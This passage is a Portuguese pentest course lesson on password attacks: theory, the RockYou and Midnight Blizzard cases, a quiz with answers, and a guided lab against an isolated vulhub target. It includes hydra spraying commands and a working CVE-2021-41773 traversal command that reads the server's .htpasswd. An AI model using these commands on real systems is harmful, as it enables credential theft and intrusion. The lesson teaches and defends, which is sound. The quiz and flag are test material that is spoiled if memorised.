@@ -1,0 +1,671 @@
+---
+slug: ataques-a-senhas
+track: trilha-5
+title: "Ataques a senhas"
+prerequisites: [ataque-a-servicos, hashing-senhas-e-quebra]
+lab: vulhub
+tasks:
+  - slug: quebrar-a-senha-do-admin
+    title: "Quebrar a senha do admin e identificar o arquivo"
+    type: flag
+    prompt: "Monte FLAG{senha_hash}: a senha EM CLARO da conta admin que protege a área /admin do alvo, e os 12 primeiros caracteres do SHA-256 do arquivo .htpasswd que você leu do servidor (o arquivo inteiro, como o alvo o guarda em /usr/local/apache2/conf/.htpasswd). Formato: FLAG{senha_hash} — por exemplo FLAG{exemplo_0123456789ab}."
+    hint: "A senha vem de quebrar o hash APR1 do admin (john ou hashcat -m 1600) com a rockyou, ou de um ataque online certeiro com o hydra. O hash é o sha256sum do .htpasswd calculado no próprio alvo (pela sua sessão/foothold do 5.2); pegue os 12 primeiros caracteres. Junte no formato FLAG{senha_hash}."
+    flag:
+      hash: "scrypt$16384$8$1$e2d57aaa94ed404f8112b651d3ca8e80aee89dc6a4f2f26c8c35ee952120e77f"
+      salt: "8a51aeec8f34b03f3396e8944b056625"
+  - slug: quiz-final
+    title: "Quiz — Ataques a senhas"
+    type: quiz
+    passPercent: 70
+    questions:
+      - question: "Qual é a diferença essencial entre um ataque de senha ONLINE e um OFFLINE?"
+        options:
+          - "O online usa a internet e o offline não usa rede nenhuma"
+          - "No online você testa cada palpite CONTRA O SERVIÇO VIVO (cada tentativa é uma requisição na rede, sujeita a rate limiting, lockout e logs); no offline você já tem os HASHES em mãos e os testa LOCALMENTE, na sua máquina, sem tocar o alvo e sem limite de velocidade"
+          - "O online quebra senhas e o offline quebra hashes — são coisas diferentes"
+          - "O offline é sempre mais lento porque precisa da wordlist inteira"
+        answer: 1
+        explanation: "A linha que separa os dois não é a internet, é ONDE o palpite é testado. Online: contra o serviço, uma requisição por tentativa — lento, barulhento e limitável pela defesa (lockout, throttling, CAPTCHA). Offline: você capturou os hashes (de um vazamento, de um arquivo lido) e os ataca na sua própria máquina, à velocidade do seu hardware, sem que o alvo veja ou possa frear. É por isso que proteger o ARMAZENAMENTO dos hashes (algoritmo lento + salt) importa tanto quanto limitar o login."
+      - question: "O password spraying inverte a lógica do ataque de dicionário clássico. Como, e por quê?"
+        options:
+          - "Testa muitas senhas contra um usuário, para ser mais rápido"
+          - "Testa UMA senha comum (ou poucas) contra MUITOS usuários, justamente para NÃO estourar o limite de tentativas de nenhuma conta e passar despercebido pelo lockout"
+          - "Espalha o ataque por vários servidores ao mesmo tempo"
+          - "Usa a mesma senha do atacante em todas as contas"
+        answer: 1
+        explanation: "O dicionário clássico fixa o usuário e varre senhas — e dispara o lockout rápido (5 erros e a conta trava). O spraying fixa a SENHA (`Verao@2024`, `password1`) e varre os usuários: cada conta recebe só uma ou duas tentativas, abaixo do limite, enquanto o atacante aposta que ALGUÉM naquela organização usa aquela senha fraca. Foi exatamente assim que a Midnight Blizzard entrou na Microsoft em 2023/2024. Contra spraying, o lockout por conta quase não ajuda — a defesa é MFA e detecção de muitos 401 de origens diferentes."
+      - question: "Você leu o `.htpasswd` do alvo e cada linha tem um hash que começa com `$apr1$`. O que isso muda no seu ataque?"
+        options:
+          - "Nada: é só pegar o valor depois do $ e usar como senha"
+          - "O `$apr1$` é a senha criptografada; basta descriptografar com a chave"
+          - "`$apr1$` identifica o formato do hash (APR1, o MD5 do Apache, COM salt): você precisa dizer isso à ferramenta (john detecta sozinho; no hashcat é `-m 1600`) e só resta quebrá-lo por força bruta/dicionário, porque é de mão única"
+          - "Significa que o arquivo está corrompido"
+        answer: 2
+        explanation: "O prefixo `$id$` é a convenção dos hashes de senha no mundo Unix e diz QUAL algoritmo gerou aquilo: `$apr1$` é o APR1 do Apache, `$1$` o md5crypt, `$6$` o sha512crypt, `$2y$` o bcrypt. Isso não é criptografia reversível — não há 'descriptografar'. É um hash de mão única com salt (o pedaço entre o segundo e o terceiro `$`), então o único caminho é o do 3.2: gerar candidatos, aplicar o MESMO algoritmo e comparar. Identificar o formato certo é o primeiro passo; errar o formato é o motivo nº 1 de 'a ferramenta não quebra nada'."
+      - question: "Por que o reúso de senha entre contas (a mesma `password1` no jsmith e no operator) é tão perigoso na prática?"
+        options:
+          - "Porque uma única senha fraca descoberta (por spraying, vazamento ou phishing) abre VÁRIAS contas de uma vez, e ainda serve para pular de um sistema a outro (credential stuffing): o atacante multiplica o acesso sem trabalho extra"
+          - "Porque ocupa mais espaço no banco de dados"
+          - "Porque senhas iguais geram hashes iguais e isso trava o servidor"
+          - "Porque o Apache não aceita senhas repetidas"
+        answer: 0
+        explanation: "Senha é um segredo que não escala: reusada, ela transforma UM comprometimento em MUITOS. No lab, uma única descoberta (`password1`) abriu duas contas. No mundo real, a senha que vazou de um fórum qualquer é testada, automaticamente, contra e-mail, banco e VPN corporativa — é o credential stuffing, e funciona porque as pessoas reusam. Por isso a defesa moderna combina gerenciador de senhas (uma senha única e forte por serviço) com verificação contra listas de senhas já vazadas e, acima de tudo, MFA."
+      - question: "A defesa decidiu trocar o algoritmo que guarda as senhas: saiu o MD5/APR1, entrou o bcrypt com custo alto. Que ataque isso enfraquece, e por quê?"
+        options:
+          - "O ataque online, porque o bcrypt bloqueia o login"
+          - "Nenhum: trocar o algoritmo não muda nada para o atacante"
+          - "O password spraying, porque o bcrypt detecta tentativas repetidas"
+          - "O ataque OFFLINE: o bcrypt é um hash DELIBERADAMENTE LENTO e com salt, então cada palpite custa caro — a mesma rockyou que varria milhões de APR1 por segundo passa a testar poucos milhares por segundo, inviabilizando a quebra em massa de senhas fortes"
+        answer: 3
+        explanation: "Hash rápido (MD5, APR1, SHA-1 puro) é ótimo para um atacante offline: o hardware testa bilhões por segundo. Hashes de senha MODERNOS (bcrypt, scrypt, Argon2) são projetados para serem lentos e ajustáveis — o 'custo' ou 'fator de trabalho' faz cada verificação levar, de propósito, uma fração de segundo. Isso não atrapalha o login legítimo (um por vez), mas destrói o ataque offline em massa: o mesmo dicionário que quebraria tudo em segundos passaria anos. O salt, somado, impede tabelas pré-computadas (rainbow tables) e força quebrar um por um. É a lição do 3.2 virando decisão de defesa."
+glossary:
+  - term: online attack
+    definition: "Ataque de senha em que cada palpite é testado contra o serviço vivo (uma requisição de login na rede). É limitado pela velocidade do serviço e visível a ele, por isso sofre rate limiting, account lockout e aparece nos logs."
+  - term: offline attack
+    definition: "Ataque de senha em que o atacante já tem os hashes em mãos (de um vazamento ou de um arquivo lido) e os quebra localmente, na própria máquina. Não toca o alvo, não tem limite imposto pela defesa e corre à velocidade do hardware do atacante."
+  - term: THC Hydra
+    definition: "Ferramenta de ataque de senha online que automatiza tentativas de login contra dezenas de protocolos (HTTP, SSH, FTP, formulários web). No Kali é o comando `hydra`; alimenta-se de listas de usuários e senhas e reporta as combinações que o serviço aceitou."
+  - term: APR1
+    definition: "Formato de hash de senha do Apache (prefixo `$apr1$`), baseado em MD5 com salt e múltiplas iterações. É o que o utilitário htpasswd grava por padrão; hoje é considerado fraco por ser rápido de quebrar, apesar do salt."
+  - term: password policy
+    definition: "O conjunto de regras que um sistema impõe às senhas (tamanho mínimo, complexidade, expiração, bloqueio após erros). Boas políticas seguem guias como o NIST SP 800-63B; políticas ruins incentivam senhas previsíveis e reúso."
+  - term: passphrase
+    definition: "Senha longa feita de várias palavras ou uma frase (ex.: `cavalo-bateria-grampo-correto`). Troca complexidade difícil de lembrar por comprimento, que é o que mais aumenta a resistência a ataques de força bruta."
+  - term: throttling
+    definition: "Defesa que atrasa de propósito as respostas de autenticação após erros (cada tentativa errada espera um pouco mais), tornando o ataque online lento demais para valer a pena, sem travar a conta do usuário legítimo como o lockout faria."
+---
+
+import duasPontas from "./img/duas-pontas-do-ataque-a-senhas.svg";
+import basicAuth from "./img/http-basic-auth-handshake.svg";
+
+## 1. Abertura — o que você vai aprender e por quê
+
+A senha é a fechadura mais comum da computação e, de longe, a mais frágil. Ano após
+ano, os relatórios de incidente contam a mesma história: a porta de entrada não foi
+uma falha exótica de memória, foi uma senha fraca, reusada ou nunca trocada. O
+*Data Breach Investigations Report* da Verizon vem repetindo, edição após edição,
+que credenciais estão entre os vetores mais usados em invasões — e você já viu, no
+3.2, por que uma senha mal guardada cai no `john` em segundos. Este módulo pega
+esse conhecimento e o leva para o campo: atacar a autenticação de um **serviço de
+rede** de verdade, pelos dois caminhos que um atacante tem à disposição.
+
+Porque existem dois, e confundi-los é o erro que trava a maioria dos iniciantes. Um
+<GlossaryTerm term="online attack">ataque online</GlossaryTerm> testa cada palpite
+**contra o serviço vivo** — é como tentar chaves numa fechadura real, uma a uma,
+com o dono olhando. Um <GlossaryTerm term="offline attack">ataque offline</GlossaryTerm>
+começa quando você já **tirou os hashes** do sistema e os quebra em casa, sem
+pressa e sem ninguém vendo. São mundos diferentes em velocidade, barulho e defesa, e
+um bom pentester sabe quando usar cada um — e por que a defesa de cada um é outra.
+
+No laboratório, você vai atacar uma área administrativa protegida por senha no mesmo
+alvo Apache dos módulos anteriores, pelos dois caminhos: primeiro online, com o
+<GlossaryTerm term="THC Hydra">hydra</GlossaryTerm>, incluindo
+<GlossaryTerm term="password spraying">password spraying</GlossaryTerm>; depois
+offline, lendo o arquivo de senhas pelo
+<GlossaryTerm term="foothold">foothold</GlossaryTerm> do 5.2 e quebrando os
+<GlossaryTerm term="hash">hashes</GlossaryTerm> com o `john`, exatamente como no 3.2.
+
+**Ao final, você vai saber:**
+
+- distinguir ataque **online** e **offline**, e escolher o certo para cada situação;
+- rodar o `hydra` contra um serviço com
+  <GlossaryTerm term="HTTP Basic authentication">HTTP Basic authentication</GlossaryTerm>,
+  fazendo tanto <GlossaryTerm term="dictionary attack">ataque de dicionário</GlossaryTerm>
+  quanto password spraying;
+- explicar por que o reúso de senha é fatal e como o
+  <GlossaryTerm term="credential stuffing">credential stuffing</GlossaryTerm> o explora;
+- identificar um hash pelo prefixo (`$apr1$`, `$6$`...), ler um arquivo
+  `.htpasswd` obtido de um serviço e quebrá-lo offline com `john`/`hashcat`;
+- montar uma <GlossaryTerm term="password policy">política de senhas</GlossaryTerm>
+  que de fato resiste — MFA, hashes lentos, throttling — e saber por que cada peça importa.
+
+**Pré-requisitos:** 5.2 — Ataque a serviços comuns (você vai reutilizar o
+foothold da CVE-2021-41773 para **ler** um arquivo do alvo). 3.2 — Hashing, senhas
+e quebra (os hashes, o `john`/`hashcat` e a wordlist `rockyou` que você aprendeu a
+usar lá são exatamente as ferramentas do caminho offline aqui).
+
+**Tempo estimado:** 3 horas, incluindo o laboratório.
+
+<Callout variant="ethics">
+Atacar a autenticação de um sistema — testar senhas, ler o arquivo de credenciais —
+só é legítimo no laboratório local ou sob **autorização por escrito** (relembre o
+1.3 e o 1.4; no Brasil, o art. 154-A do Código Penal). Rodar o `hydra` contra um
+login de verdade na internet, mesmo "só para testar", é intrusão. Tudo aqui acontece
+dentro da rede isolada do lab, que não enxerga o seu PC nem a internet.
+</Callout>
+
+## 2. Teoria aprofundada — o conceito por dentro
+
+### 2.1 Por que a senha é o elo fraco
+
+Uma senha é um segredo compartilhado: o usuário conhece, o servidor guarda uma forma
+de conferir, e a autenticação é provar que você sabe o segredo. O problema é humano,
+não matemático. As pessoas escolhem senhas que conseguem lembrar — e o que é fácil
+de lembrar é fácil de adivinhar. O vazamento do RockYou (seção 4) provou isso com
+32 milhões de senhas reais: a mais comum era `123456`, e um terço delas tinha seis
+caracteres ou menos. Essas 32 milhões de senhas viraram o arquivo `rockyou.txt`, a
+wordlist que você usou no 3.2 e vai usar aqui — a prova de que "senha que gente
+escolhe" é um espaço pequeno e previsível.
+
+O atacante explora exatamente esse encolhimento. Em teoria, uma senha de 8
+caracteres aleatórios tem um <GlossaryTerm term="keyspace">keyspace</GlossaryTerm>
+(o conjunto de todas as combinações possíveis) gigantesco. Na prática, quase ninguém
+usa 8 caracteres aleatórios: usa uma palavra, um nome, uma data, com um `!` no fim.
+O ataque não varre o keyspace inteiro — ele varre a listinha de candidatos prováveis,
+que a humanidade gentilmente já compilou em wordlists.
+
+### 2.2 As duas pontas: online e offline
+
+Aqui está a divisão que organiza o módulo inteiro. Todo ataque a senhas é de um de
+dois tipos, e eles quase não têm nada em comum além do objetivo.
+
+<Figure
+  src={duasPontas}
+  alt="Diagrama das duas pontas de um ataque a senhas, partindo de um serviço com login (/admin protegido por HTTP Basic Auth). O caminho de cima é o ataque online com o Hydra: envia tentativas pela rede, em duas modalidades — dictionary attack (muitas senhas contra um usuário) e password spraying (uma senha contra muitos usuários); é lento, barulhento e sofre rate limiting e lockout. O caminho de baixo é o ataque offline: usando o foothold do 5.2, o atacante lê o arquivo .htpasswd, obtém os hashes APR1 e os quebra localmente com John ou hashcat e a rockyou; é rápido e silencioso, mas exige obter os hashes antes. Os dois caminhos convergem na credencial recuperada, que dá acesso ao /admin e, por fim, à flag."
+  caption="As duas pontas do ataque a senhas: online (contra o serviço, pelo topo) e offline (contra os hashes lidos do servidor, por baixo). Neste módulo você percorre as duas, e elas convergem na mesma credencial."
+/>
+
+O **ataque online** mira o serviço funcionando. Você manda uma tentativa de login e o
+serviço responde "entrou" ou "errou". É o único caminho quando você **não** tem os
+hashes — só o login à sua frente. Mas paga três pedágios: é **lento** (limitado pela
+velocidade do serviço e pela rede), é **barulhento** (cada tentativa é uma requisição
+registrada em log) e é **freável** pela defesa (o serviço pode travar a conta,
+atrasar as respostas, exigir CAPTCHA). Quem defende tem controle sobre esse canal.
+
+O **ataque offline** só é possível depois que você **captura os hashes** — de um
+vazamento de banco, de um backup exposto, ou, como no nosso lab, lendo um arquivo
+pelo foothold. A partir daí, o alvo saiu da equação: você quebra os hashes na sua
+máquina, à velocidade do seu hardware, **sem** rate limiting, **sem** lockout, **sem**
+aparecer em log nenhum do alvo. É isso que torna o offline tão temido: uma vez que o
+banco de senhas vaza, nenhuma política de login protege mais nada — só a qualidade do
+hash (algoritmo lento + salt) ainda segura o atacante. Essa é a ponte direta com o
+3.2.
+
+### 2.3 As modalidades do ataque online
+
+Dentro do online, a forma como você combina usuários e senhas muda tudo — inclusive a
+chance de ser pego.
+
+- **<GlossaryTerm term="dictionary attack">Ataque de dicionário</GlossaryTerm>:** fixa
+  **um usuário** e varre **muitas senhas** de uma lista. É o ataque "clássico", mas
+  tem um calcanhar de aquiles: dispara o <GlossaryTerm term="account lockout">account
+  lockout</GlossaryTerm> depressa (cinco erros e a conta trava).
+- **<GlossaryTerm term="brute force">Força bruta</GlossaryTerm> pura:** varre o
+  keyspace de forma sistemática (`aaaa`, `aaab`, ...). Viável offline contra hash
+  fraco; quase inútil online, por lentidão e lockout.
+- **<GlossaryTerm term="password spraying">Password spraying</GlossaryTerm>:** a
+  inversão esperta. Fixa **uma senha** comum (`password1`, `Verao@2024`) e a testa
+  contra **muitos usuários**. Cada conta leva só uma ou duas tentativas — abaixo do
+  limite de lockout — enquanto o atacante aposta que **alguém** na organização usa
+  aquela senha. É silencioso, escala para milhares de contas e passa por baixo das
+  defesas pensadas para o dicionário. Foi assim que invadiram a Microsoft (seção 4).
+- **<GlossaryTerm term="credential stuffing">Credential stuffing</GlossaryTerm>:** usa
+  pares usuário+senha **já vazados** de outros serviços, apostando no reúso. Não
+  "adivinha" nada — só testa segredos que já são reais em outro lugar.
+
+### 2.4 Por que o HTTP Basic Auth é um alvo tão fácil
+
+O serviço do lab protege a área `/admin` com
+<GlossaryTerm term="HTTP Basic authentication">HTTP Basic authentication</GlossaryTerm>,
+o esquema de autenticação mais simples da web — e entender seu mecanismo explica por
+que ferramentas como o hydra o despedaçam.
+
+<Figure
+  src={basicAuth}
+  alt="Diagrama de sequência do HTTP Basic Auth entre o cliente atacante (Hydra) e o servidor Apache que protege /admin. Passo 1: GET /admin/ sem credencial recebe 401 Unauthorized com WWW-Authenticate: Basic realm Restricted Admin Area, o desafio. Passo 2: o cliente reenvia GET /admin/ com Authorization: Basic base64(usuario:senha), lembrando que base64 é codificação reversível e não criptografia. Passo 3a: senha errada devolve 401 e o cliente pode tentar outra na hora. Passo 3b: senha certa devolve 200 OK com a página. Nota em destaque: como cada palpite é uma requisição isolada e a resposta diz na hora se acertou, sem estado nem CAPTCHA, a ferramenta dispara milhares de tentativas por segundo."
+  caption="O handshake do Basic Auth: o 401 anuncia o desafio, o cliente reenvia a credencial em base64, e o 200/401 revela na hora se acertou. É essa simplicidade sem estado que torna o Basic Auth brute-forçável."
+/>
+
+O fluxo é cru. O cliente pede `/admin/`; o servidor responde `401 Unauthorized` com o
+cabeçalho `WWW-Authenticate: Basic realm="..."` — o desafio. O cliente então reenvia
+a **mesma** requisição com um cabeçalho `Authorization: Basic <base64(usuário:senha)>`.
+Repare: o `base64` é só uma **codificação reversível** (qualquer um reverte com
+`base64 -d`), **não** é criptografia — sem HTTPS, a senha viaja praticamente aberta.
+O servidor confere e responde `200` (entrou) ou `401` (errou).
+
+Três propriedades fazem disso um prato cheio para o atacante: **(1) não há estado** —
+cada tentativa é uma requisição independente, sem sessão, sem token, sem passo
+intermediário; **(2) a resposta é imediata e binária** — `200` ou `401` dizem na
+hora se o palpite acertou; e **(3) por padrão não há freio** — nada de CAPTCHA, de
+atraso, de lockout, a não ser que o administrador acrescente. Resultado: a ferramenta
+abre dezenas de conexões em paralelo e dispara milhares de palpites por segundo. O
+Basic Auth não é inseguro por ter um bug — é simples demais para resistir sozinho.
+
+## 3. Como o ataque funciona — a mecânica
+
+Vamos ver as duas pontas em comandos reais, do alvo do lab. Os endereços foram
+trocados por exemplos genéricos: `192.168.0.2` é o Kali (atacante) e `192.168.0.10`
+é o alvo (o `vulhub`, que do Kali atende como `http://vulhub/`).
+
+### 3.1 O caminho online: hydra contra o Basic Auth
+
+O <GlossaryTerm term="THC Hydra">hydra</GlossaryTerm> precisa de três coisas: quem
+atacar (o serviço e o caminho), com quais usuários e com quais senhas. Para o Basic
+Auth sobre HTTP, o módulo é o `http-get`, e o caminho protegido é `/admin/`.
+
+Primeiro, o ataque de dicionário — um usuário (`admin`), muitas senhas de uma lista
+curta e direcionada (`-l` é um login único, `-P` é um arquivo de senhas):
+
+```console
+$ hydra -l admin -P small.txt -I vulhub http-get /admin/
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
+[DATA] attacking http-get://vulhub:80/admin/
+[80][http-get] host: vulhub   misc: /admin/   login: admin   password: superman
+1 of 1 target successfully completed, 1 valid password found
+```
+
+O hydra testou cada senha da lista como um `Authorization: Basic ...` e parou na que
+devolveu `200`: `admin:superman`. (O `-I` ignora um arquivo de sessão anterior; use-o
+para começar limpo.)
+
+Agora o **password spraying**: inverta os papéis. Fixe **uma** senha comum e varra
+**vários** usuários (`-L` é um arquivo de logins, `-p` é uma senha única):
+
+```console
+$ hydra -L users.txt -p password1 -t 1 -I vulhub http-get /admin/
+[80][http-get] host: vulhub   misc: /admin/   login: jsmith     password: password1
+[80][http-get] host: vulhub   misc: /admin/   login: operator   password: password1
+1 of 1 target successfully completed, 2 valid passwords found
+```
+
+Uma única senha abriu **duas** contas — `jsmith` e `operator` reusam `password1`.
+Esse é o reúso de senha em ação, e é exatamente o que o spraying explora: você não
+precisa quebrar a senha de ninguém em particular, só achar a senha fraca que *alguém*
+no grupo usou.
+
+### 3.2 O caminho offline: ler os hashes e quebrá-los
+
+O caminho online te dá a senha, mas é barulhento. O offline é cirúrgico — e só é
+possível porque você já tem um <GlossaryTerm term="foothold">foothold</GlossaryTerm>
+no alvo (o do 5.2). O Apache guarda as credenciais do `/admin` num arquivo
+`.htpasswd`. Com a execução de comando da CVE-2021-41773, você **lê** esse arquivo:
+
+```console
+$ curl -s --path-as-is -d "echo Content-Type: text/plain; echo; cat /usr/local/apache2/conf/.htpasswd" \
+    "http://vulhub/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
+admin:$apr1$L4b5x5Aa$bJXPX7bqGkv5VO0Ah8yIX.
+jsmith:$apr1$L4b5x5Bb$ZjBhI/CeFAbNgtz4CTabY.
+operator:$apr1$L4b5x5Cc$Ryjv33q1AzOM92nrTEjka.
+```
+
+Aqui o 3.2 volta inteiro. Cada linha é `usuário:hash`, e o hash começa com `$apr1$` —
+o prefixo que identifica o formato <GlossaryTerm term="APR1">APR1</GlossaryTerm> (o
+MD5 do Apache, com <GlossaryTerm term="salt">salt</GlossaryTerm>). Lendo a estrutura
+`$apr1$L4b5x5Aa$bJXPX...`: `apr1` é o algoritmo, `L4b5x5Aa` é o salt, e o resto é o
+hash em si. Não há o que "descriptografar" — é de mão única. O caminho é o do 3.2:
+gerar candidatos, aplicar o **mesmo** APR1 com o **mesmo** salt, e comparar. O `john`
+reconhece o formato sozinho:
+
+```console
+$ john loot.htpasswd --wordlist=rockyou.txt
+Loaded 3 password hashes with 3 different salts (md5crypt-long, crypt(3) $1$ [MD5 32/64])
+password1        (jsmith)
+password1        (operator)
+superman         (admin)
+3g 0:00:00:00 DONE (2026-10-20 16:49) 75.00g/s ...
+```
+
+As três senhas caem instantaneamente — porque APR1 é um hash **rápido** e as senhas
+estão na rockyou. Guarde esse contraste para a seção de defesa: um hash moderno e
+lento (bcrypt, Argon2) transformaria esse "0 segundos" em anos.
+
+## 4. Casos reais — o que aconteceu no mundo
+
+### RockYou: o vazamento que virou a wordlist do mundo (2009)
+
+Em **dezembro de 2009**, o site RockYou — que fazia widgets para redes sociais —
+sofreu uma invasão por SQL injection que expôs cerca de **32 milhões** de contas. O
+agravante que tornou o caso histórico: a RockYou guardava as senhas **em texto puro**,
+sem nenhum hash. Em **janeiro de 2010**, a Imperva publicou a análise "Consumer
+Password Worst Practices" dessas 32 milhões de senhas reais, e o retrato foi
+devastador: a senha mais comum era `123456`; cerca de **30%** dos usuários tinham
+senhas de seis caracteres ou menos; e quase metade usava nomes, palavras de
+dicionário ou sequências triviais. O CTO da Imperva resumiu o risco: com esse perfil,
+um atacante "ganha acesso a uma conta nova por segundo".
+
+- **Impacto:** o conjunto de senhas vazou e, limpo, virou o arquivo `rockyou.txt` —
+  até hoje a wordlist padrão de quebra de senhas, embutida no Kali e usada neste
+  próprio módulo. Um vazamento de 2009 ainda quebra senhas em 2026.
+- **Lição:** guardar senha em texto puro é o pecado capital; e o comportamento humano
+  de escolher senhas previsíveis é tão estável que uma lista de 2009 continua eficaz.
+  É a justificativa empírica de todo o caminho offline.
+- **Fonte:** [Imperva — Consumer Password Worst Practices (análise do RockYou)](https://www.imperva.com/company/press_releases/imperva-releases-detailed-analysis-of-32-million-breached-consumer-passwords/).
+
+### Microsoft / Midnight Blizzard: spraying na porta dos fundos (2023–2024)
+
+Em **12 de janeiro de 2024**, a Microsoft detectou uma invasão em seus sistemas
+corporativos, atribuída ao grupo estatal russo **Midnight Blizzard** (também conhecido
+como APT29/Nobelium). O acesso inicial, segundo a própria Microsoft, começou em
+**fins de novembro de 2023** com um **password spraying** que comprometeu "uma conta
+de *tenant* de teste legada, não-produtiva" que **não tinha MFA habilitado**.
+
+O detalhe que faz desse caso uma aula de spraying: a Microsoft descreve que o atacante
+"ajustou os ataques de spraying a um número limitado de contas, usando um número baixo
+de tentativas para evitar detecção" e roteou o tráfego por "redes de proxies
+residenciais", misturando-se a IPs de usuários legítimos. Ou seja: nada de milhares de
+tentativas numa conta (que dispararia o lockout), e sim pouquíssimas tentativas,
+espalhadas, de origens que pareciam normais. A partir daquela conta esquecida, o grupo
+escalou e acessou e-mails de membros da liderança sênior e das equipes de segurança e
+jurídico.
+
+- **Impacto:** leitura e exfiltração de e-mails e anexos de executivos e de times
+  sensíveis de uma das maiores empresas de tecnologia do mundo — a partir de **uma
+  conta de teste sem MFA**.
+- **Lição:** o spraying derrota as defesas pensadas para o dicionário (lockout por
+  conta não ajuda contra uma tentativa por conta) e explora a conta esquecida, sem
+  MFA, que ninguém monitorava. A defesa real é MFA em **tudo**, inventário de contas
+  legadas e detecção de muitos `401` de origens diversas.
+- **Fonte:** [Microsoft Security — Midnight Blizzard: guidance for responders (25/01/2024)](https://www.microsoft.com/en-us/security/blog/2024/01/25/midnight-blizzard-guidance-for-responders-on-nation-state-attack/).
+
+## 5. Mãos à obra — o laboratório guiado
+
+**Objetivo:** ao terminar, você terá atacado a autenticação da área `/admin` do alvo
+pelos **dois** caminhos — online (hydra, com spraying) e offline (ler o `.htpasswd`
+pelo foothold e quebrar com `john`) — e montado a flag `FLAG{senha_hash}` com a senha
+em claro da conta `admin` e a impressão digital (SHA-256) do arquivo de credenciais.
+
+<Callout variant="warning">
+Um laboratório ativo por vez (regra dos 16 GB). Se outro lab estiver rodando, pare-o
+antes. O alvo `vulhub` só é alcançável de dentro do Kali, pelo nome `vulhub`, na rede
+interna — ele não tem internet e não enxerga o seu PC. **Todo ataque de senha aqui
+acontece dentro dessa rede isolada.**
+</Callout>
+
+### 5.1 Subir o laboratório e encontrar a porta trancada
+
+1. No painel **Laboratório**, no topo desta página, clique em **Iniciar** e espere o
+   desktop do Kali abrir. (Pela linha de comando do WSL, a alternativa é
+   `scripts/lab.sh up vulhub`.)
+2. No Kali, abra um terminal e confirme que existe uma área protegida por senha:
+
+```console
+$ curl -sS -i http://vulhub/admin/ | head -6
+HTTP/1.1 401 Unauthorized
+Date: Tue, 20 Oct 2026 16:48:51 GMT
+Server: Apache/2.4.49 (Unix)
+WWW-Authenticate: Basic realm="Restricted Admin Area"
+Content-Length: 381
+Content-Type: text/html; charset=iso-8859-1
+```
+
+O `401` com `WWW-Authenticate: Basic` é o anúncio da seção 2.4: há uma fechadura de
+HTTP Basic Auth em `/admin/`. É isso que vamos arrombar pelos dois caminhos.
+
+### 5.2 Caminho online — dicionário com o hydra (guiado)
+
+Monte uma lista de senhas candidata e mire o `admin`. Comece pequeno e direcionado —
+no online, menos é mais (cada tentativa é barulho):
+
+```console
+$ printf '123456\npassword\npassword1\nqwerty\nletmein\nsuperman\nadmin\n' > small.txt
+$ hydra -l admin -P small.txt -I vulhub http-get /admin/
+[80][http-get] host: vulhub   misc: /admin/   login: admin   password: superman
+1 of 1 target successfully completed, 1 valid password found
+```
+
+Você já tem a senha do `admin`. Confirme-a entrando de verdade (um `200` é a
+fechadura cedendo):
+
+```console
+$ curl -s -o /dev/null -w '%{http_code}\n' -u admin:superman http://vulhub/admin/
+200
+```
+
+### 5.3 Desafio A — password spraying
+
+**Seu objetivo:** sem atacar nenhuma conta em particular até o lockout, descubra
+**quais outras contas** reusam uma senha fraca comum. Monte uma lista de usuários
+plausíveis (`admin`, `jsmith`, `operator`, `root`, `backup`...) e faça o spraying de
+**uma** senha contra todas. Qual senha vale a pena espalhar primeiro?
+
+<Hint title="Dica 1">
+No hydra, troque os papéis das letras: `-L users.txt` (vários logins de um arquivo) e
+`-p senha` (uma senha única). A senha para espalhar é uma das mais comuns da sua
+`small.txt` — pense em qual delas tem mais cara de "senha corporativa preguiçosa".
+</Hint>
+
+<Hint title="Dica 2">
+Use `-t 1` para ir devagar (uma tarefa por vez, imitando o "low-and-slow" da Midnight
+Blizzard) e não passe de uma ou duas senhas por conta — o espírito do spraying é
+ficar **abaixo** do limite de lockout.
+</Hint>
+
+<Solution title="Solução">
+```console
+$ printf 'admin\njsmith\noperator\nroot\nbackup\n' > users.txt
+$ hydra -L users.txt -p password1 -t 1 -I vulhub http-get /admin/
+[80][http-get] host: vulhub   misc: /admin/   login: jsmith     password: password1
+[80][http-get] host: vulhub   misc: /admin/   login: operator   password: password1
+1 of 1 target successfully completed, 2 valid passwords found
+```
+
+Uma senha, duas contas: `jsmith` e `operator` reusam `password1`. É o reúso de senha
+e o spraying num só golpe — você não quebrou ninguém, só achou a senha fraca que o
+grupo compartilha.
+</Solution>
+
+### 5.4 Desafio B — o caminho offline e a flag
+
+**Seu objetivo:** sair do online e fazer o ataque **offline**, que te dá a prova
+definitiva. Você precisa de duas coisas para a flag:
+
+- a **senha em claro** da conta `admin` (você já a tem do 5.2, mas confirme-a
+  quebrando o hash — é o ponto do módulo);
+- os **12 primeiros caracteres** do SHA-256 do arquivo `.htpasswd` **inteiro**, do
+  jeito que o alvo o guarda.
+
+Para os dois, você precisa **ler o `.htpasswd` do servidor**. Ele não é servido pela
+web (está em `conf/`, fora da raiz). Como chegar até ele? Lembre do 5.2: a
+CVE-2021-41773 não só executa — ela te deixa **ler arquivos** do alvo. Leia o
+`.htpasswd`, calcule o SHA-256 dele **no próprio alvo**, e quebre os hashes offline
+com a `rockyou`.
+
+<Hint title="Dica 1">
+O foothold do 5.2 roda comandos no alvo via `/cgi-bin/.%2e/...`. Dois comandos
+interessam: `cat /usr/local/apache2/conf/.htpasswd` (ler) e `sha256sum
+/usr/local/apache2/conf/.htpasswd` (a impressão digital). Calcular o hash no alvo
+evita qualquer diferença de bytes na transferência.
+</Hint>
+
+<Hint title="Dica 2">
+Salve as linhas `usuário:$apr1$...` num arquivo e jogue o `john` com a rockyou nele,
+como no 3.2. O `john` detecta o APR1 sozinho; se quiser usar o hashcat, o modo do
+APR1 é o `-m 1600` (e ele precisa do `--username` porque cada linha tem o `usuário:`
+na frente).
+</Hint>
+
+<Solution title="Solução">
+Leia o arquivo e tire a impressão digital dele, tudo pelo foothold:
+
+```console
+$ curl -s --path-as-is -d "echo Content-Type: text/plain; echo; cat /usr/local/apache2/conf/.htpasswd" \
+    "http://vulhub/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" | tee loot.htpasswd
+admin:$apr1$L4b5x5Aa$bJXPX7bqGkv5VO0Ah8yIX.
+jsmith:$apr1$L4b5x5Bb$ZjBhI/CeFAbNgtz4CTabY.
+operator:$apr1$L4b5x5Cc$Ryjv33q1AzOM92nrTEjka.
+
